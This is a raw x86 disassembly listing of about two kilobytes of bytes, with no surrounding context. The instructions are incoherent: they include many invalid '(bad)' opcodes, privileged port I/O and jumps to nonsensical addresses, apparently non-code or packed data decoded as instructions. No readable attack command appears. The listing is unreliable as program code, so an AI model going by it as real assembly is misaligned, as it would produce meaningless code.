  4105a0:	sbb    al,0x5b
  4105a2:	push   cs
  4105a3:	fdivr  QWORD PTR [edx]
  4105a5:	out    0xd3,eax
  4105a7:	in     al,0xd0
  4105a9:	iret   
  4105aa:	or     al,0x51
  4105ac:	and    eax,esi
  4105ae:	pop    esi
  4105af:	arpl   WORD PTR [edx],cx
  4105b1:	mov    eax,ds:0x8d06e085
  4105b6:	mov    WORD PTR [edx-0x1e92cae5],fs
  4105bc:	pop    esi
  4105bd:	adc    al,0x5a
  4105bf:	xor    DWORD PTR [eax-0x33],eax
  4105c2:	mov    al,0xbf
  4105c4:	out    0xfd,al
  4105c6:	mov    esp,0x11bccda
  4105cb:	shr    DWORD PTR [edi],0x51
  4105ce:	(bad)  
  4105cf:	push   ecx
  4105d0:	jnp    0x41060b
  4105d2:	xchg   esi,eax
  4105d3:	repz les esi,FWORD PTR [ecx+0x3ce79066]
  4105da:	push   edx
  4105db:	push   esp
  4105dc:	dec    edx
  4105dd:	test   DWORD PTR [edi-0x6f],esi
  4105e0:	push   0xc3a0234f
  4105e5:	mov    DWORD PTR [ebx+0x35],ecx
  4105e8:	ins    DWORD PTR es:[edi],dx
  4105e9:	add    ebx,ebx
  4105eb:	add    al,0x3
  4105ed:	adc    BYTE PTR [edi],0x22
  4105f0:	popf   
  4105f1:	jge    0x41059e
  4105f3:	pop    ebp
  4105f4:	add    al,0x33
  4105f6:	adc    bh,dl
  4105f8:	test   BYTE PTR [esi+eax*1-0x77],dh
  4105fc:	sbb    BYTE PTR [ebx-0x7255bf9e],ch
  410602:	iret   
  410603:	das    
  410604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410605:	call   0xe4a82ab8
  41060a:	pop    eax
  41060b:	dec    esp
  41060c:	inc    esi
  41060d:	hlt    
  41060e:	std    
  41060f:	test   al,0xac
  410611:	shl    DWORD PTR [ecx],cl
  410613:	scas   al,BYTE PTR es:[edi]
  410614:	adc    ebp,DWORD PTR [eax-0x15]
  410617:	dec    esp
  410618:	rol    DWORD PTR [esi],1
  41061a:	ror    ecx,0x8b
  41061d:	adc    BYTE PTR ds:0xe1d64bc0,bl
  410623:	dec    eax
  410624:	cmp    edx,DWORD PTR [ecx]
  410626:	lods   al,BYTE PTR ds:[esi]
  410627:	push   edx
  410628:	stos   DWORD PTR es:[edi],eax
  410629:	push   ebx
  41062a:	push   ebx
  41062b:	fimul  DWORD PTR [edx]
  41062d:	hlt    
  41062e:	cmc    
  41062f:	mov    al,0xa0
  410631:	jb     0x41065d
  410633:	pusha  
  410634:	push   0xffffffd5
  410636:	(bad)  
  410637:	in     al,dx
  410638:	pop    edx
  410639:	mov    ebp,0x8f6011d5
  41063e:	ret    
  41063f:	cmp    al,0xb0
  410641:	xchg   DWORD PTR [esi],esi
  410643:	icebp  
  410644:	js     0x410633
  410646:	repnz mov di,0xbce4
  41064b:	imul   esi,DWORD PTR [edi+0x1e1c296a],0x4f2a0d09
  410655:	mov    esi,0x8f60f079
  41065a:	push   ebx
  41065b:	sbb    DWORD PTR [ecx],edi
  41065d:	leave  
  41065e:	ret    
  41065f:	mov    esi,0xf6fa2601
  410664:	in     al,dx
  410665:	jmp    0x57abe16
  41066a:	jge    0x410678
  41066c:	aam    0xc
  41066e:	icebp  
  41066f:	fisubr WORD PTR [edi-0x32a4f852]
  410675:	mov    bl,0x91
  410677:	hlt    
  410678:	std    
  410679:	shr    ebx,0xcb
  41067c:	mov    cl,0x95
  41067e:	dec    eax
  41067f:	add    esi,eax
  410681:	out    dx,al
  410682:	inc    ebx
  410683:	enter  0x5f45,0x20
  410687:	arpl   WORD PTR ds:[esi+0x36],bx
  41068b:	aad    0x1f
  41068d:	ins    DWORD PTR es:[edi],dx
  41068e:	cmp    eax,0x8f5e32b1
  410693:	in     eax,dx
  410694:	mov    edi,0x2d1dc3e6
  410699:	or     DWORD PTR [eax+0x40443d9e],eax
  41069f:	ja     0x410660
  4106a1:	mov    dl,0x61
  4106a3:	and    eax,0xa0281cda
  4106a8:	push   0xffffffc3
  4106aa:	sbb    eax,DWORD PTR [ebx]
  4106ac:	mov    cs,WORD PTR [ebp+0xf]
  4106af:	hlt    
  4106b0:	loop   0x410731
  4106b2:	ret    0x3bab
  4106b5:	mov    ds:0x6ef83f4,eax
  4106ba:	je     0x41064d
  4106bc:	pop    es
  4106bd:	pushf  
  4106be:	imul   eax,DWORD PTR [eax+0x136f29c6],0x5e29628c
  4106c8:	sub    al,0x5c
  4106ca:	repz push ebx
  4106cc:	cli    
  4106cd:	fisttp WORD PTR [esi+0x65]
  4106d0:	push   ss
  4106d1:	pop    esp
  4106d2:	jmp    0x410738
  4106d4:	shl    DWORD PTR [edx],1
  4106d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106d7:	cmp    al,bl
  4106d9:	mov    edx,0x4442af75
  4106de:	test   DWORD PTR [eax+0x5734dc24],edx
  4106e4:	sbb    al,0x43
  4106e6:	add    eax,0x11e6b0e
  4106eb:	sbb    al,0xd6
  4106ed:	(bad)  
  4106ee:	adc    dl,dh
  4106f0:	pop    eax
  4106f1:	dec    ebp
  4106f2:	scas   eax,DWORD PTR es:[edi]
  4106f3:	cld    
  4106f4:	jp     0x4106f0
  4106f6:	pop    edx
  4106f7:	(bad)  
  4106f8:	and    al,0x4f
  4106fa:	in     al,0xd1
  4106fc:	dec    eax
  4106fd:	js     0x41072e
  4106ff:	adc    DWORD PTR [eax],ecx
  410701:	lea    edi,[ebx+0xaf50a23]
  410707:	sub    dl,BYTE PTR [esi-0x46]
  41070a:	out    0xed,eax
  41070c:	cmp    dh,BYTE PTR [ebp-0x1316ec09]
  410712:	ret    0xc281
  410715:	cmp    BYTE PTR [ebp+esi*8-0x12],cl
  410719:	or     cl,BYTE PTR [edi+0x1bf687cd]
  41071f:	sbb    BYTE PTR [edx-0x5f99c12b],bl
  410725:	xor    eax,0x93e8c2ee
  41072a:	pop    ds
  41072b:	popf   
  41072c:	jno    0x410729
  41072e:	or     ch,BYTE PTR [edx-0x50]
  410731:	jmp    0xd5c7:0xdf9af31d
  410738:	jp     0x410712
  41073a:	inc    ecx
  41073b:	mov    esi,0x2515ccfb
  410740:	in     eax,dx
  410741:	js     0x41078a
  410743:	sub    ah,BYTE PTR [edi+0x4916f65f]
  410749:	popa   
  41074a:	dec    edi
  41074b:	push   ecx
  41074c:	mov    al,ds:0x753a007b
  410751:	mov    cl,bh
  410753:	pop    es
  410754:	int3   
  410755:	popa   
  410756:	mov    eax,0x226c369d
  41075b:	jg     0x410722
  41075d:	cmp    esi,esp
  41075f:	ins    BYTE PTR es:[edi],dx
  410760:	pop    eax
  410761:	in     al,dx
  410762:	pop    ds
  410763:	jg     0x4107d5
  410765:	xor    ecx,DWORD PTR [edi+0x7fb33da3]
  41076b:	clc    
  41076c:	cmc    
  41076d:	xor    esi,ebp
  41076f:	fst    DWORD PTR [edi+0x4f]
  410772:	dec    ebx
  410773:	push   0x51
  410775:	add    eax,0xf2734bcb
  41077a:	xchg   ebx,eax
  41077b:	in     al,0xc6
  41077d:	jmp    0xbce36c7e
  410782:	iret   
  410783:	push   0xed450a5f
  410788:	pop    edi
  410789:	aaa    
  41078a:	adc    ch,BYTE PTR [ecx-0x79df3de0]
  410790:	and    al,0x15
  410792:	icebp  
  410793:	cmp    ebx,0xd95a1eec
  410799:	pop    ebx
  41079a:	test   DWORD PTR [ecx],edx
  41079c:	js     0x410776
  41079e:	inc    edi
  41079f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107a0:	push   cs
  4107a1:	add    al,BYTE PTR [edi+ebx*1+0x2c]
  4107a5:	pusha  
  4107a6:	shl    BYTE PTR [ecx+edx*1-0xb81c537],1
  4107ad:	test   BYTE PTR [ecx+0x78122a47],bl
  4107b3:	add    al,0xee
  4107b5:	add    BYTE PTR [ecx-0x5be7b5ac],dl
  4107bb:	add    DWORD PTR [eax-0xd],ebx
  4107be:	adc    BYTE PTR [edx+ecx*2+0x2],0xd3
  4107c3:	test   BYTE PTR [edi+0x61],dl
  4107c6:	sub    BYTE PTR [edi-0x2f],ch
  4107c9:	sahf   
  4107ca:	ss aad 0xa3
  4107cd:	out    0xb3,al
  4107cf:	inc    esp
  4107d0:	mov    esi,0x61073289
  4107d5:	outs   dx,BYTE PTR ds:[esi]
  4107d6:	(bad)  [eax+eax*1-0x43]
  4107da:	stos   BYTE PTR es:[edi],al
  4107db:	add    edi,DWORD PTR [edx+0x53b19e76]
  4107e1:	dec    eax
  4107e2:	xchg   BYTE PTR [ecx+edi*1],bl
  4107e5:	and    eax,DWORD PTR [ecx]
  4107e7:	cmp    ebx,esi
  4107e9:	fs push es
  4107eb:	adc    DWORD PTR [ebp-0x7e],ecx
  4107ee:	xchg   esi,eax
  4107ef:	or     bl,BYTE PTR [edi-0x64]
  4107f2:	icebp  
  4107f3:	inc    ebx
  4107f4:	or     bh,dl
  4107f6:	imul   ebx,DWORD PTR [ebx],0xec27b7a6
  4107fc:	xor    ch,BYTE PTR [edx-0x526d83dd]
  410802:	retf   0xfb36
  410805:	test   bl,0xa6
  410808:	(bad)  
  410809:	adc    al,0x25
  41080b:	jno    0x4107ad
  41080d:	std    
  41080e:	adc    ebx,DWORD PTR [esi-0x33]
  410811:	repnz leave 
  410813:	sbb    BYTE PTR [ebp+edi*8-0x1c],0xf7
  410818:	mov    cl,cl
  41081a:	push   edx
  41081b:	inc    esp
  41081c:	add    bl,BYTE PTR [ecx-0x41]
  41081f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410820:	loopne 0x4107a9
  410822:	mov    ds:0x3c2a99d8,eax
  410827:	cmp    eax,0x30ec348
  41082c:	push   esi
  41082d:	nop
  41082e:	mov    ebp,DWORD PTR [ecx-0x60]
  410831:	leave  
  410832:	fistp  DWORD PTR [edx-0x12462999]
  410838:	add    DWORD PTR [edi+0x4],eax
  41083b:	iret   
  41083c:	lods   al,BYTE PTR ds:[esi]
  41083d:	xlat   BYTE PTR ds:[ebx]
  41083e:	pop    ss
  41083f:	pop    edx
  410840:	pop    ds
  410841:	jmp    0x5f52:0x598fee08
  410848:	pop    edi
  410849:	mov    DWORD PTR [ebx-0x34],ebx
  41084c:	lahf   
  41084d:	fwait
  41084e:	inc    ecx
  41084f:	ins    BYTE PTR es:[edi],dx
  410850:	xchg   ecx,eax
  410851:	sbb    eax,0x38b4adc7
  410856:	ins    DWORD PTR es:[edi],dx
  410857:	leave  
  410858:	test   BYTE PTR [ecx+0x68],0x28
  41085c:	inc    eax
  41085d:	adc    DWORD PTR [ebp+0x27ca2359],0xf93d086c
  410867:	add    al,0xf8
  410869:	into   
  41086a:	add    eax,0xd5049e8d
  41086f:	jne    0x41088d
  410871:	xchg   esi,eax
  410872:	mov    ebp,0x27336605
  410877:	push   edx
  410878:	iret   
  410879:	shl    BYTE PTR [ebp+0x4c2087d7],1
  41087f:	xchg   ebx,eax
  410880:	xor    DWORD PTR [edx-0x11],esp
  410883:	aad    0x84
  410885:	(bad)  
  410886:	icebp  
  410887:	nop
  410888:	mov    edi,0x4af9f254
  41088d:	add    ebx,DWORD PTR [edx]
  41088f:	inc    edi
  410890:	xchg   edi,eax
  410891:	mov    ecx,0x6871d645
  410896:	sbb    al,0xb7
  410898:	out    0x7a,eax
  41089a:	inc    esp
  41089b:	mov    bl,0x80
  41089d:	hlt    
  41089e:	test   BYTE PTR ds:0x95442ae2,bh
  4108a4:	pop    es
  4108a5:	lods   eax,DWORD PTR ds:[esi]
  4108a6:	jns    0x41088b
  4108a8:	cmp    DWORD PTR [esp+eiz*8-0x3c79b38a],0x6f1a0197
  4108b3:	std    
  4108b4:	add    al,0x54
  4108b6:	sub    esi,edx
  4108b8:	or     ecx,edx
  4108ba:	push   cs
  4108bb:	push   0x593056e3
  4108c0:	cmp    al,0x2
  4108c2:	ret    
  4108c3:	or     BYTE PTR [edi+0x15],bh
  4108c6:	ret    0xfa5b
  4108c9:	out    0xe7,al
  4108cb:	int3   
  4108cc:	mov    cl,0xcd
  4108ce:	jnp    0x410887
  4108d0:	or     BYTE PTR es:[ebp-0x40],dh
  4108d4:	adc    ch,ch
  4108d6:	pusha  
  4108d7:	fnstcw WORD PTR [ecx+ebx*8-0x5377ddd5]
  4108de:	and    eax,0xef97714d
  4108e3:	jp     0x410882
  4108e5:	not    DWORD PTR [edi+0x66cad05e]
  4108eb:	jnp    0x41093f
  4108ed:	cmc    
  4108ee:	int3   
  4108ef:	gs and eax,0x7195eabe
  4108f5:	mov    eax,ds:0xc0fb0f76
  4108fa:	dec    eax
  4108fb:	dec    esi
  4108fc:	out    dx,al
  4108fd:	mov    eax,0xd67245f2
  410902:	pop    edi
  410903:	jle    0x410967
  410905:	out    dx,eax
  410906:	popf   
  410907:	jne    0x410985
  410909:	jg     0x410902
  41090b:	or     al,0xdd
  41090d:	push   esp
  41090e:	sbb    al,0x8
  410910:	rsm    
  410912:	sbb    edx,edx
  410914:	xor    eax,0x4102afa
  410919:	add    DWORD PTR [ebx],edi
  41091b:	rcr    BYTE PTR [ebx+0x42],0xdb
  41091f:	inc    eax
  410920:	hlt    
  410921:	sbb    eax,0x2ae72ff9
  410926:	jno    0x4108d1
  410928:	mov    esi,0x8a81f8fc
  41092d:	test   eax,esi
  41092f:	and    al,dl
  410931:	mov    dh,0x38
  410933:	into   
  410934:	cli    
  410935:	push   ds
  410936:	lods   eax,DWORD PTR ds:[esi]
  410937:	xlat   BYTE PTR ds:[ebx]
  410938:	in     al,dx
  410939:	and    esp,DWORD PTR [ebp-0x69]
  41093c:	pop    edx
  41093d:	xor    DWORD PTR [edi+0x474ec9dd],edx
  410943:	pop    edi
  410944:	push   eax
  410945:	jb     0x410950
  410947:	jnp    0x4108f2
  410949:	repnz into 
  41094b:	or     dh,al
  41094d:	popa   
  41094e:	into   
  41094f:	push   ss
  410950:	shl    DWORD PTR ds:0xb3361275,1
  410956:	loope  0x410970
  410958:	(bad)  
  410959:	push   0x10
  41095b:	mov    cl,0x81
  41095d:	mov    edx,DWORD PTR [eax+0x4216eba1]
  410963:	jae    0x41092e
  410965:	or     al,0x27
  410967:	mov    BYTE PTR [ebp-0x41],0xa9
  41096b:	inc    eax
  41096c:	xor    ah,bh
  41096e:	xchg   edi,eax
  41096f:	shl    DWORD PTR [edi],0xe1
  410972:	adc    esp,DWORD PTR [edx-0x20337685]
  410978:	les    eax,FWORD PTR [eax+edi*1+0x5978cf5d]
  41097f:	mov    DWORD PTR [ecx],edi
  410981:	jb     0x410997
  410983:	sub    al,BYTE PTR [edi+0x16]
  410986:	xor    BYTE PTR [edx-0x60],0x5f
  41098a:	dec    eax
  41098b:	xor    BYTE PTR [edi+eax*8],dh
  41098e:	sub    bl,BYTE PTR [ecx+0x68]
  410991:	jmp    0x410a0b
  410993:	jo     0x4109c2
  410995:	cld    
  410996:	cli    
  410997:	inc    edi
  410998:	mov    dl,0x10
  41099a:	jo     0x410955
  41099c:	push   ebp
  41099d:	jge    0x4109f8
  41099f:	cmp    al,0x7a
  4109a1:	xchg   esi,eax
  4109a2:	jmp    0x1d09fa72
  4109a7:	clc    
  4109a8:	and    BYTE PTR [eax+0x4dea68f6],dh
  4109ae:	leave  
  4109af:	dec    edx
  4109b0:	nop
  4109b1:	dec    edi
  4109b2:	mov    esp,0x770ae214
  4109b7:	ja     0x410943
  4109b9:	(bad)  
  4109ba:	mov    eax,ds:0xd4b1b829
  4109bf:	mov    BYTE PTR [esi],al
  4109c1:	sbb    BYTE PTR [ecx+edx*2+0x6c],bh
  4109c5:	cld    
  4109c6:	xor    al,cl
  4109c8:	and    DWORD PTR [edi+0x6e6a17fd],ecx
  4109ce:	or     BYTE PTR [esi-0x1a9e474b],ah
  4109d4:	rol    DWORD PTR ds:0x2161de,1
  4109da:	push   ebx
  4109db:	ror    BYTE PTR [esi+eax*1-0x6e],cl
  4109df:	fwait
  4109e0:	in     eax,dx
  4109e1:	push   ss
  4109e2:	add    cl,BYTE PTR [ebp-0x32]
  4109e5:	lods   eax,DWORD PTR ds:[esi]
  4109e6:	inc    edx
  4109e7:	and    eax,esi
  4109e9:	jmp    0x15d0:0x9fa250ca
  4109f0:	xchg   ecx,eax
  4109f1:	pop    ebx
  4109f2:	mov    esp,0x12ead0a5
  4109f7:	in     al,0xb9
  4109f9:	xchg   DWORD PTR [ebx+0x23],eax
  4109fc:	xor    DWORD PTR [eax+ebx*4],ebp
  4109ff:	and    ecx,DWORD PTR [ebx+0x6b]
  410a02:	cmp    esi,eax
  410a04:	dec    edx
  410a05:	lea    esi,[edx+0x6fb2136f]
  410a0b:	pop    edi
  410a0c:	xchg   esp,esi
  410a0e:	ror    BYTE PTR [edi+0x3d],cl
  410a11:	cmp    BYTE PTR [eax-0x23],ch
  410a14:	xor    BYTE PTR [esi],dh
  410a16:	arpl   bp,di
  410a18:	adc    eax,0xd485e081
  410a1d:	push   edi
  410a1e:	push   esi
  410a1f:	mov    edi,0xb8854019
  410a24:	outs   dx,BYTE PTR ds:[esi]
  410a25:	push   edi
  410a26:	push   ecx
  410a27:	mov    esp,0x5a6e7324
  410a2c:	test   al,0x14
  410a2e:	xchg   edx,eax
  410a2f:	mov    eax,gs:0xed726940
  410a35:	loope  0x410a88
  410a37:	pop    eax
  410a38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a39:	pop    ebx
  410a3a:	js     0x410a03
  410a3c:	(bad)  
  410a3d:	pop    ebp
  410a3e:	in     al,dx
  410a3f:	xchg   esp,ecx
  410a41:	mov    ?,WORD PTR [edi-0x33dd66bb]
  410a47:	and    bl,BYTE PTR [ecx-0x7f454d49]
  410a4d:	es loope 0x410a01
  410a50:	sbb    DWORD PTR [eax+0x14],ebp
  410a53:	mov    ah,0x48
  410a55:	das    
  410a56:	(bad)  
  410a57:	loopne 0x4109ec
  410a59:	push   esi
  410a5a:	xchg   ecx,eax
  410a5b:	stc    
  410a5c:	(bad)  
  410a5e:	data16 or ch,BYTE PTR [edi]
  410a61:	bound  esi,QWORD PTR [ebx]
  410a63:	call   ecx
  410a65:	sar    BYTE PTR [esi+ecx*8],cl
  410a68:	push   eax
  410a69:	outs   dx,DWORD PTR ds:[esi]
  410a6a:	sbb    al,0x7a
  410a6c:	xchg   BYTE PTR [ebp+ebx*1+0xc],al
  410a70:	push   es
  410a71:	arpl   di,bp
  410a73:	test   DWORD PTR [ecx],0x41b0a558
  410a79:	add    bl,dl
  410a7b:	std    
  410a7c:	xchg   esi,eax
  410a7d:	xchg   BYTE PTR [ebx],bh
  410a7f:	dec    esi
  410a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a81:	sbb    esp,DWORD PTR [ebx-0x3326faef]
  410a87:	cwde   
  410a88:	fstp   QWORD PTR [edi+ebx*8-0x72314128]
  410a8f:	leave  
  410a90:	sub    esi,DWORD PTR ds:0x604fefad
  410a96:	mov    dl,0xea
  410a98:	out    0x76,al
  410a9a:	xchg   edx,eax
  410a9b:	sub    al,0xe8
  410a9d:	repz aas 
  410a9f:	push   es
  410aa0:	adc    edx,DWORD PTR [esi]
  410aa2:	mov    cl,0x95
  410aa4:	aaa    
  410aa5:	dec    ecx
  410aa7:	fs jge 0x410abf
  410aaa:	pop    esi
  410aab:	mov    ch,0x99
  410aad:	fdivr  st,st(2)
  410aaf:	fcmovne st,st(6)
  410ab1:	pop    ss
  410ab2:	sub    DWORD PTR [esi+0x6],esi
  410ab5:	mov    bl,BYTE PTR [ebp+0x1316a221]
  410abb:	addr16 popf 
  410abd:	pop    eax
  410abe:	scas   eax,DWORD PTR es:[edi]
  410abf:	mov    ?,WORD PTR [ebx-0x58]
  410ac2:	sub    esp,DWORD PTR [edx+0x7642edb9]
  410ac8:	add    BYTE PTR gs:[ecx+0x50b90b9a],cl
  410acf:	idiv   DWORD PTR [ebx]
  410ad1:	jb     0x410a65
  410ad3:	xchg   ebx,eax
  410ad4:	lahf   
  410ad5:	dec    esi
  410ad6:	pushf  
  410ad7:	sub    al,0xa5
  410ad9:	cmp    cl,cl
  410adb:	and    DWORD PTR [ebp-0x510f40bb],ecx
  410ae1:	mov    ebp,0xe429b4f5
  410ae6:	dec    eax
  410ae7:	push   esp
  410ae8:	push   ebp
  410ae9:	or     eax,0x48a8f4d1
  410aee:	int    0x3e
  410af0:	jl     0x410aab
  410af2:	sub    DWORD PTR [ebp+0x15],0x44987093
  410af9:	shl    BYTE PTR [ebp+0x6e3d0e05],0x4
  410b00:	jnp    0x410b5b
  410b02:	pop    es
  410b03:	jns    0x410a86
  410b05:	pop    ebp
  410b06:	sub    ah,BYTE PTR [ecx]
  410b08:	mov    cl,0xc0
  410b0a:	mov    ebx,0xf815da69
  410b0f:	jnp    0x410b4b
  410b11:	(bad)  
  410b12:	inc    edx
  410b13:	dec    edi
  410b14:	and    cl,0xf0
  410b17:	mov    BYTE PTR [ebx],bl
  410b19:	stos   DWORD PTR es:[edi],eax
  410b1a:	aas    
  410b1b:	cmp    ah,bl
  410b1d:	jg     0x410b64
  410b1f:	cwde   
  410b20:	stos   DWORD PTR es:[edi],eax
  410b21:	popa   
  410b22:	cwde   
  410b23:	fldenv [ebp+0x2b81927c]
  410b29:	jl     0x410b70
  410b2b:	xchg   esp,eax
  410b2c:	lahf   
  410b2d:	mov    bl,0x15
  410b2f:	or     eax,0xfae26daa
  410b34:	rol    DWORD PTR [ebx-0x5f],1
  410b37:	inc    edx
  410b38:	pop    eax
  410b39:	mov    esp,0xcfaf5c80
  410b3e:	add    bl,BYTE PTR [edx-0x70]
  410b41:	cwde   
  410b42:	jmp    0x410b97
  410b44:	in     eax,dx
  410b45:	ret    
  410b46:	sub    al,0x6f
  410b48:	sub    cl,BYTE PTR [esi+0x43]
  410b4b:	and    al,0x17
  410b4d:	xchg   DWORD PTR [ebx],ecx
  410b4f:	jmp    0x55f4781e
  410b54:	lock aam 0x33
  410b57:	jne    0x410ade
  410b59:	jnp    0x410b86
  410b5b:	sti    
  410b5c:	cli    
  410b5d:	jbe    0x410b6a
  410b5f:	nop
  410b60:	jns    0x410b12
  410b62:	pop    esi
  410b63:	add    al,0xfa
  410b65:	pop    edi
  410b66:	push   edx
  410b67:	mov    esp,0x389b65c5
  410b6c:	cwde   
  410b6d:	inc    ebx
  410b6e:	sub    al,0x1f
  410b70:	inc    eax
  410b71:	shl    BYTE PTR [ebx+0x39],1
  410b74:	sbb    BYTE PTR [ecx-0x77],0xe4
  410b78:	repz sbb cl,BYTE PTR [ebx]
  410b7b:	ret    0x1dd2
  410b7e:	pusha  
  410b7f:	mov    cl,0x86
  410b81:	sub    eax,0x70d99602
  410b86:	push   ebx
  410b87:	mov    edi,eax
  410b89:	sti    
  410b8a:	push   ss
  410b8b:	dec    edi
  410b8c:	loop   0x410bfb
  410b8e:	xlat   BYTE PTR ds:[ebx]
  410b8f:	test   al,0xd0
  410b91:	test   dh,dh
  410b93:	jmp    0x410ba4
  410b95:	loopne 0x410b59
  410b97:	ret    0x1e13
  410b9a:	es jnp 0x410b83
  410b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b9e:	jnp    0x410b8d
  410ba0:	stc    
  410ba1:	xor    al,0xc6
  410ba3:	pop    DWORD PTR [edi+0x11]
  410ba6:	hlt    
  410ba7:	ins    BYTE PTR es:[edi],dx
  410ba8:	pop    edx
  410ba9:	pusha  
  410baa:	iret   
  410bab:	cmc    
  410bac:	repnz (bad) 
  410bae:	clc    
  410baf:	cwde   
  410bb0:	(bad)
  410bb3:	push   0x3d874395
  410bb8:	stc    
  410bb9:	push   cs
  410bba:	call   0x1ce73b02
  410bbf:	dec    esi
  410bc0:	xchg   dl,bh
  410bc2:	pop    esi
  410bc3:	and    ebp,DWORD PTR ds:0x776c75ac
  410bc9:	or     al,dh
  410bcb:	in     al,dx
  410bcc:	jnp    0x410bca
  410bce:	ds jmp 0x40225f71
  410bd4:	hlt    
  410bd5:	mov    ebx,0x281a3e5e
  410bda:	add    DWORD PTR [eax-0x1c],esp
  410bdd:	inc    eax
  410bde:	out    dx,al
  410bdf:	push   edi
  410be0:	xchg   edi,eax
  410be1:	sbb    cl,BYTE PTR [esi]
  410be3:	call   0x729f:0xdfef810c
  410bea:	pop    ebp
  410beb:	in     al,0xc4
  410bed:	cdq    
  410bee:	mov    eax,ds:0x4d4baae8
  410bf3:	sbb    dl,BYTE PTR [esi+0x16]
  410bf6:	xchg   esi,eax
  410bf7:	mul    BYTE PTR [esi+0x63]
  410bfa:	add    bl,BYTE PTR [eax+0x10499830]
  410c00:	and    edi,edi
  410c02:	aam    0xd6
  410c04:	test   BYTE PTR [ebp+esi*1-0x46],bl
  410c08:	bound  esi,QWORD PTR [edi]
  410c0a:	sbb    ah,bl
  410c0c:	scas   al,BYTE PTR es:[edi]
  410c0d:	imul   ecx,DWORD PTR [edi+eax*8-0x77ac5b],0x3a
  410c15:	xchg   edi,eax
  410c16:	push   cs
  410c17:	lods   al,BYTE PTR ds:[esi]
  410c18:	clc    
  410c19:	inc    ebx
  410c1a:	dec    ecx
  410c1b:	jg     0x410c32
  410c1d:	mov    eax,ecx
  410c1f:	and    eax,0xc0d4fb9d
  410c24:	mov    ebp,0x45a91a7
  410c29:	adc    edx,eax
  410c2b:	outs   dx,BYTE PTR ds:[esi]
  410c2c:	cmp    ah,BYTE PTR [ecx+0x55cde5c5]
  410c32:	add    BYTE PTR [edi+ebx*1-0x1d],dl
  410c36:	nop
  410c37:	imul   esi,DWORD PTR [edx+0x4c35a942],0xd1810f16
  410c41:	(bad)  
  410c42:	sbb    bh,BYTE PTR [esi-0x5fa28528]
  410c48:	xor    al,BYTE PTR [eax+eax*1]
  410c4b:	ins    DWORD PTR es:[edi],dx
  410c4c:	and    eax,0x87f5e9e5
  410c51:	imul   BYTE PTR [eax+0x15]
  410c54:	add    dl,dl
  410c56:	xor    dh,BYTE PTR [ebx]
  410c58:	xchg   esi,eax
  410c59:	out    0xe5,eax
  410c5b:	sub    al,BYTE PTR ds:0x4f972a49
  410c61:	repnz sub eax,0x6d5c9dc9
  410c67:	data16 sub al,0x14
  410c6a:	cwde   
  410c6b:	jne    0x410c0b
  410c6d:	in     eax,dx
  410c6e:	fimul  DWORD PTR [esi]
  410c70:	jge    0x410c97
  410c72:	outs   dx,BYTE PTR ds:[esi]
  410c73:	cwde   
  410c74:	inc    ebp
  410c75:	test   eax,0x318b9a4c
  410c7a:	and    al,0xe2
  410c7c:	jno    0x410c1a
  410c7e:	xchg   esp,eax
  410c7f:	cmp    BYTE PTR [ecx+0x4d88ce93],cl
  410c85:	test   DWORD PTR [ecx],esi
  410c87:	push   DWORD PTR [eax+esi*4]
  410c8a:	dec    eax
  410c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c8c:	push   DWORD PTR [ecx-0x2b8bf7ce]
  410c92:	test   ch,al
  410c94:	or     DWORD PTR [edi+0x39e00900],ebx
  410c9a:	xchg   edx,eax
  410c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c9c:	dec    ecx
  410c9d:	popf   
  410c9e:	call   0xfcd69245
  410ca3:	test   DWORD PTR [ecx-0x12],eax
  410ca6:	dec    esi
  410ca7:	fsub   QWORD PTR [esi+0x5f95aee7]
  410cad:	pop    esp
  410cae:	lahf   
  410caf:	add    esp,eax
  410cb1:	pop    edx
  410cb2:	scas   al,BYTE PTR es:[edi]
  410cb3:	pop    edi
  410cb4:	mov    cl,0x92
  410cb6:	xchg   ebx,eax
  410cb7:	sub    cl,dl
  410cb9:	data16 aam 0x76
  410cbc:	out    0xeb,eax
  410cbe:	mov    bl,0xa8
  410cc0:	inc    esp
  410cc1:	inc    eax
  410cc2:	(bad)  
  410cc3:	push   0x3c
  410cc5:	ja     0x410c5f
  410cc7:	clc    
  410cc8:	or     BYTE PTR [ebx+edx*4+0x774f5ac8],dh
  410ccf:	mov    eax,0x7d5184f5
  410cd4:	daa    
  410cd5:	lods   eax,DWORD PTR ds:[esi]
  410cd6:	jle    0x410d1b
  410cd8:	ja     0x410d3f
  410cda:	cld    
  410cdb:	sbb    DWORD PTR [esi],eax
  410cdd:	push   edx
  410cde:	out    dx,al
  410cdf:	or     ch,BYTE PTR [ebx-0x5]
  410ce2:	mov    esi,0x5ed30b48
  410ce7:	pushf  
  410ce8:	cli    
  410ce9:	dec    esp
  410cea:	xchg   edx,eax
  410ceb:	dec    ebx
  410cec:	repz jg 0x410cde
  410cef:	xchg   esi,eax
  410cf0:	imul   ecx,DWORD PTR [eax],0x768ab741
  410cf6:	clc    
  410cf7:	xor    DWORD PTR [esi-0x1],0x6bb6da5d
  410cfe:	inc    ebx
  410cff:	fiadd  WORD PTR [esi+0x7c]
  410d02:	ins    DWORD PTR es:[edi],dx
  410d03:	pop    es
  410d04:	pop    ss
  410d05:	mov    dl,0x94
  410d07:	add    ebp,DWORD PTR [esp+esi*8+0x7285ff50]
  410d0e:	(bad)  
  410d10:	daa    
  410d11:	mov    edx,0xd3b24eec
  410d16:	sahf   
  410d17:	cdq    
  410d18:	jae    0x410d60
  410d1a:	lahf   
  410d1b:	mov    eax,ds:0x69766cfa
  410d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d21:	xor    bl,BYTE PTR [eax]
  410d23:	in     eax,0xd4
  410d25:	sub    al,0x8c
  410d27:	imul   ebp,esp,0x65
  410d2a:	iret   
  410d2b:	sbb    ecx,DWORD PTR [ecx-0x41]
  410d2e:	mov    ds:0xe2cea533,al
  410d33:	mov    edx,0xb9eafae1
  410d38:	ret    0x551a
  410d3b:	push   esp
  410d3c:	cld    
  410d3d:	lods   al,BYTE PTR ds:[esi]
  410d3e:	into   
